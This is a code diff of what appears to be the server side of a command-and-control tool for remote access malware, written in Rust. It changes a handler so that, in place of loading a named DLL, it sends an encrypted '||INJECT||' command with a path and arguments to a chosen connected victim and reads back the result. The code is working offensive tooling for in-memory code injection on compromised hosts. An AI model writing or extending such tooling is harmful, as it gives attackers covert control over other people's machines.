@@ -106,16 +106,20 @@ pub async fn handle_run_script(active_connections: &Arc<Mutex<HashMap<String, Co
     cmdout = cmdout.replace("||cmd||", "");
     Ok(cmdout.trim().to_string())
 }
-pub async fn handle_run_dll(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str) -> Result<String, String> {
-    let parts: Vec<&str> = command.splitn(3, ' ').collect();
+pub async fn handle_in_memory(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str) -> Result<String, String> {
+    let parts: Vec<&str> = command.splitn(4, ' ').collect();
     if parts.len() < 3 {
-        return Err(format!("Invalid command, expected '{} ID command'", parts[0]));
+        return Err(format!("Invalid command, expected '{} ID command'", parts[1]));
     }
     let id: usize = match parts[1].trim().parse() {
         Ok(num) => num,
         Err(_) => return Err("Invalid ID".to_string()),
     };
-    let dll_name = parts[2].trim().to_string();
+    let path = parts[2].trim().to_string();
+    let mut args_export = String::from("");
+    if parts.len() == 4 {
+        args_export = parts[3].trim().to_string()
+    }
     let active_connections = active_connections.lock().await;
 
     if id > active_connections.len() {
@@ -124,12 +128,12 @@ pub async fn handle_run_dll(active_connections: &Arc<Mutex<HashMap<String, Conne
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
     let stream = connection_info.stream.clone();
     let shared_secret = connection_info.shared_secret;
-    let command = format!("||RDLL|| {}", dll_name);
+    let command = format!("||INJECT|| {} {}", path, args_export);
 
     let encrypted_command = encrypt(command.as_bytes(), &shared_secret).expect("Failed to encrypt");
     stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
     stream.lock().await.flush().await.expect("Error flushing stream");
-    
+
     let mut buffer = [0; 1024];
     stream.lock().await.read(&mut buffer).await.expect("Error reading from stream");
     let data = decrypt(&buffer, &shared_secret).expect("Failed to decrypt");
